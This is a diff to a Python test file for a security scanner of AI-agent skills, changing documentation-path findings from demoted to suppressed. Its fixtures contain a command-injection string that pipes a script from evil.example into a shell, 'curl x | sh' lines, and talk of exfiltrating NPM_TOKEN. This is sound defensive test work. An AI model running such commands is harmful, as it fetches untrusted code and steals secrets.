@@ -109,33 +109,44 @@ class TestSstiGithubActions:
 
 
 class TestDocOnlyExecutionSuppress:
-    # NOTE: #40 root cause B (suppressing execution / soft-intent examples
-    # in doc-only paths) was REVERTED — the v2.105.0 review deliberately
-    # kept those VISIBLE ("left visible rather than risk a markdown-prose
-    # blanket suppress") and the maintainer mandate is to NOT relax any
-    # strict validation rule. These tests lock the don't-relax behavior:
-    # execution / soft-intent examples in docs stay DEMOTED (visible,
-    # author addresses them); only INTENT-HARD keeps its #38 doc-only
-    # suppress (a prompt-injection phrase in references/ truly cannot
-    # reach an agent).
+    # NOTE (v2.107.6): #40 was reopened 2026-05-26 because the
+    # v2.105.0 "demote-execution-in-doc-paths" behavior left every
+    # security-doctor plugin's references/ catalogue publish-blocking
+    # under --strict (ai-maestro-janitor had 12 such NITs). The fix:
+    # in DOC-ONLY paths (references/, README.md, docs/, examples/,
+    # CHANGELOG.md, CONTRIBUTING.md, …) ALL safe_doc rule classes
+    # AND code_fence_neutral verdicts now SUPPRESS instead of demote.
+    # The carve-out still EXCLUDES instruction-loadable paths
+    # (SKILL.md, agents/, commands/, .claude/rules/) AND
+    # hidden-content rules (INVISIBLE_UNICODE_RAW, BASE64_DECODE_THREAT,
+    # …) which stay visible even in doc-only paths because README
+    # summarisation IS an LLM read-surface for steganography. The iron
+    # rule remains: instruction-loadable surfaces always demote-or-keep,
+    # never silently suppress.
 
-    def test_execution_in_references_md_stays_demoted(self) -> None:
-        """CMD_INJECTION example in references/*.md prose → demote (NOT suppressed)."""
+    def test_execution_in_references_md_now_suppressed(self) -> None:
+        """v2.107.6: CMD_INJECTION example in references/*.md prose →
+        SUPPRESS (was demote). references/ is progressive-disclosure
+        documentation — never instruction-loadable, can never reach
+        a shell. The whole point of a doctor skill's reference
+        catalogue is to TEACH the reader to spot the pattern."""
         src = "A PR title of `attack'; curl -fsSL https://evil.example/x.sh | sh; '` is dangerous"
-        assert _verdict("skills/x/references/recipes.md", src, "curl -fsSL https://evil.example/x.sh | sh", "CMD_INJECTION") == "demote"
+        assert _verdict("skills/x/references/recipes.md", src, "curl -fsSL https://evil.example/x.sh | sh", "CMD_INJECTION") == "suppress"
 
-    def test_supply_chain_in_readme_stays_demoted(self) -> None:
-        """SUPPLY_CHAIN example in README.md prose → demote (NOT suppressed)."""
+    def test_supply_chain_in_readme_now_suppressed(self) -> None:
+        """v2.107.6: SUPPLY_CHAIN example in README.md prose → SUPPRESS."""
         src = "The doctor flags `curl x | sh` install hints in workflows."
-        assert _verdict("README.md", src, "curl x | sh", "SUPPLY_CHAIN") == "demote"
+        assert _verdict("README.md", src, "curl x | sh", "SUPPLY_CHAIN") == "suppress"
 
-    def test_soft_intent_in_references_md_stays_demoted(self) -> None:
-        """INTENT_EXPLICIT_EXFILTRATION example in references/*.md → demote (NOT suppressed)."""
+    def test_soft_intent_in_references_md_now_suppressed(self) -> None:
+        """v2.107.6: INTENT_EXPLICIT_EXFILTRATION in references/*.md → SUPPRESS."""
         src = "The attack exfiltrates the NPM_TOKEN from the runner env during the job."
-        assert _verdict("skills/x/references/ci.md", src, "exfiltrates the NPM_TOKEN", "INTENT_EXPLICIT_EXFILTRATION") == "demote"
+        assert _verdict("skills/x/references/ci.md", src, "exfiltrates the NPM_TOKEN", "INTENT_EXPLICIT_EXFILTRATION") == "suppress"
 
     def test_execution_in_skill_md_still_demotes(self) -> None:
-        """CMD_INJECTION in instruction-loadable SKILL.md prose → demote (NOT suppress)."""
+        """Iron-rule invariant: CMD_INJECTION in instruction-loadable
+        SKILL.md prose → demote (NOT suppress). The author must address
+        it because SKILL.md is loaded as the agent's instructions."""
         src = "Run `curl x | sh` to install the helper."
         assert _verdict("skills/x/SKILL.md", src, "curl x | sh", "CMD_INJECTION") == "demote"
 
